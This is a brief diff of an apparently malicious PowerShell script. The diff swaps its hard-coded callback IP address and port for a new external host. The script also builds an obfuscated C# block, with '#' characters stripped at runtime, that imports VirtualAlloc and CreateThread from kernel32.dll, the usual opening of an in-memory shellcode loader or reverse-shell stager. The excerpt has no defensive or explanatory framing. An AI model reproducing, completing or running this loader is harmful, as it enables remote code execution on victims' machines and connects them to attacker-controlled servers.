@@ -1,4 +1,4 @@
-Set-Variable -Name ip -Value ("65.0.50.125"); Set-Variable -Name port -Value (22698); Set-Variable -Name c -Value (@"
+Set-Variable -Name ip -Value ("206.189.80.59"); Set-Variable -Name port -Value (22812); Set-Variable -Name c -Value (@"
 [D#ll#Imp#ort("ker#ne#l32.#dll")] publi#c static e#xtern In#tPtr Virt#ualAl#loc(Int#Ptr w, ui#nt x, ui#nt y, ui#nt z);
 [Dl#lI##mpor#t("kern#el32.d#ll")] pub#lic st#atic ex#tern Int#Ptr Cr#eate#Thr#ead(Int#Ptr u, u#int v, IntP#tr w, Int#Ptr x, ui#nt y, IntPtr z);
 "@.replace("#", ""))
